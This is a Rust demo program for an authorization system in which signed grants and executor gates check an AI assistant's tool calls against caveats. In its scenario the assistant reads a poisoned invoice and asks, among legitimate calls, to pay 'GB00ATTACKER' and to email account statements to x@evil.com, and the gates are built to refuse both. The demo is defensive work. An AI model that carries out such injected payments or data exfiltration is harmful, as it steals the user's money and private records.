//! One-command banking demo: a prompt-injected agent, two executor gates, and
//! a transcript for the independent verifier.
//!
//! ```text
//! ./examples/demo-banking.sh          # builds, runs this, then runs pqsub-verify
//! cargo run --release --example banking_demo -p pqsub-cli -- OUT_DIR
//! ```
//!
//! The bank and mail tools are in-memory mocks; everything else (keys, grants,
//! signatures, gate decisions, receipts, transcript) is the real pqsub code
//! path. The clock is simulated so runs are comparable.

use pqsub_core::*;
use std::path::PathBuf;

const T0: u64 = 1_800_000_000_000;
const HOUR: u64 = 3_600_000;

fn reason_name(r: u8) -> &'static str {
    match r {
        2 => "GRANT_UNKNOWN",
        3 => "GRANT_INVALID",
        4 => "GRANT_CHAIN",
        5 => "GRANT_EXPIRED",
        6 => "CAVEAT_VIOLATION",
        7 => "BUDGET_EXCEEDED",
        8 => "CALL_INVALID",
        9 => "GRANT_REVOKED",
        _ => "-",
    }
}

fn args(pairs: &[(&str, cjson::Value)]) -> Vec<u8> {
    cjson::encode(&cjson::Value::Obj(
        pairs
            .iter()
            .map(|(k, v)| ((*k).to_string(), v.clone()))
            .collect(),
    ))
}

fn main() -> std::result::Result<(), Box<dyn std::error::Error>> {
    let out = PathBuf::from(
        std::env::args()
            .nth(1)
            .unwrap_or_else(|| "demo-banking-out".into()),
    );
    std::fs::create_dir_all(&out)?;
    let hedged = SigningMode::Hedged;

    println!("== 1. Authority is delegated once, then only narrowed ==");
    let k = AgentKeypair::generate;
    let (root, principal, agent, bank_key, mail_key) = (k()?, k()?, k()?, k()?, k()?);
    let id = |kp: &AgentKeypair, role: &str| {
        let c = IdentityClaims {
            name: role.into(),
            role: role.into(),
            not_before_ms: T0,
            not_after_ms: T0 + HOUR,
        };
        IdentityDocument::issue(&root, kp.public_key(), c, hedged)
    };
    let ids = vec![
        id(&principal, "principal")?,
        id(&agent, "assistant")?,
        id(&bank_key, "bank")?,
        id(&mail_key, "mail")?,
    ];
    let all = |kind| Caveat {
        scope: Scope::All,
        kind,
    };
    let only = |tool: &str, kind| Caveat {
        scope: Scope::Tool(tool.into()),
        kind,
    };
    let spec = |aud: &AgentKeypair, parent, depth, caveats| GrantSpec {
        audience: aud.agent_id(),
        parent,
        not_before_ms: T0,
        not_after_ms: T0 + HOUR,
        depth,
        nonce: [depth; 16],
        caveats,
    };
    let g0 = Grant::issue(
        &root,
        spec(
            &principal,
            Hash32::ZERO,
            1,
            vec![all(CaveatKind::ToolAllow(vec![
                "send_email".into(),
                "send_money".into(),
            ]))],
        ),
        hedged,
    )?;
    let g1 = Grant::issue(
        &principal,
        spec(
            &agent,
            g0.id(),
            0,
            vec![
                only(
                    "send_money",
                    CaveatKind::ArgOneOf {
                        path: "/to".into(),
                        values: vec![cjson::encode(&cjson::Value::Str("DE89LANDLORD".into()))],
                    },
                ),
                only(
                    "send_money",
                    CaveatKind::IntRange {
                        path: "/amount".into(),
                        min: 1,
                        max: 120_000,
                    },
                ),
                only("send_money", CaveatKind::Executor(vec!["bank".into()])),
                only(
                    "send_email",
                    CaveatKind::EmailDomain {
                        path: "/to".into(),
                        domains: vec!["acme.com".into()],
                    },
                ),
                only("send_email", CaveatKind::Executor(vec!["mail".into()])),
            ],
        ),
        hedged,
    )?;
    println!(
        "root      -> principal  grant {}  may use send_money, send_email",
        &g0.id().to_hex()[..12]
    );
    println!(
        "principal -> assistant  grant {}  pay only DE89LANDLORD, 1..120000; email only @acme.com",
        &g1.id().to_hex()[..12]
    );

    let mut bank = Gate::new(root.public_key().clone(), bank_key, ids.clone())?;
    let mut mail = Gate::new(root.public_key().clone(), mail_key, ids.clone())?;
    for gate in [&mut bank, &mut mail] {
        gate.add_grant(g0.clone());
        gate.add_grant(g1.clone());
    }

    // The mock tools. Only the executors hold them.
    let mut ledger: Vec<String> = Vec::new();
    let mut outbox: Vec<String> = Vec::new();

    println!("\n== 2. The assistant reads a poisoned invoice and asks for four tool calls ==");
    use cjson::Value::{Int, Str};
    let calls = [
        (
            "bank",
            "send_money",
            args(&[("amount", Int(95_000)), ("to", Str("DE89LANDLORD".into()))]),
            "pay the rent",
        ),
        (
            "bank",
            "send_money",
            args(&[("amount", Int(5_000)), ("to", Str("GB00ATTACKER".into()))]),
            "injected: pay the attacker",
        ),
        (
            "mail",
            "send_email",
            args(&[
                ("body", Str("Rent paid".into())),
                ("to", Str("landlord@acme.com".into())),
            ]),
            "notify the landlord",
        ),
        (
            "mail",
            "send_email",
            args(&[
                ("body", Str("account statements".into())),
                ("to", Str("x@evil.com".into())),
            ]),
            "injected: exfiltrate data",
        ),
    ];
    for (exec, tool, a, why) in &calls {
        println!(
            "assistant -> {exec:<5} {tool:<10} {:<48} ({why})",
            String::from_utf8_lossy(a)
        );
    }

    println!("\n== 3. Each executor's gate decides before anything runs ==");
    let mut trace = TraceBuilder::new();
    for (i, (exec, tool, a, why)) in calls.iter().enumerate() {
        let now = T0 + 1000 * (i as u64 + 1);
        let spec = EntrySpec {
            kind: ManifestKind::ToolCall,
            recipient: Recipient::Role((*exec).into()),
            intent: (*why).into(),
            payload_hash: None,
            timestamp_ms: now,
        };
        let ext = Ext::ToolCall(ToolCall {
            tool: (*tool).into(),
            args: a.clone(),
            chain: vec![g0.id(), g1.id()],
        });
        let call = trace.append_ext(&agent, spec, ext, hedged)?.clone();
        let gate = if *exec == "bank" {
            &mut bank
        } else {
            &mut mail
        };
        let receipt = gate
            .execute(&call, now, |args| {
                let s = String::from_utf8_lossy(args).into_owned();
                if *exec == "bank" {
                    ledger.push(s)
                } else {
                    outbox.push(s)
                }
                Ok(b"done".to_vec())
            })
            .map_err(|d| format!("{d:?}"))?;
        let Ext::Receipt(r) = &receipt else {
            return Err("gate returned a non-receipt".into());
        };
        let verdict = if r.status == ReceiptStatus::Refused {
            format!("REFUSED  {}", reason_name(r.reason))
        } else {
            "EXECUTED".into()
        };
        println!(
            "{:<10} {:<27} {:<26} {}",
            tool,
            why,
            verdict,
            String::from_utf8_lossy(a)
        );
        let rspec = EntrySpec {
            kind: ManifestKind::Receipt,
            recipient: Recipient::Agent(agent.agent_id()),
            intent: "receipt".into(),
            payload_hash: None,
            timestamp_ms: now,
        };
        trace.append_ext(gate.key(), rspec, receipt, hedged)?;
    }
    println!(
        "bank ledger: {} payment(s)   mail outbox: {} message(s)",
        ledger.len(),
        outbox.len()
    );

    let t = Transcript {
        identities: ids,
        grants: vec![g0, g1],
        entries: trace.into_entries(),
    };
    std::fs::write(out.join("transcript.pqst"), t.encode()?)?;
    std::fs::write(out.join("root.pub"), root.public_key().to_file_bytes())?;
    println!(
        "\nwrote {0}/transcript.pqst and {0}/root.pub (the only thing an auditor needs)",
        out.display()
    );
    Ok(())
}
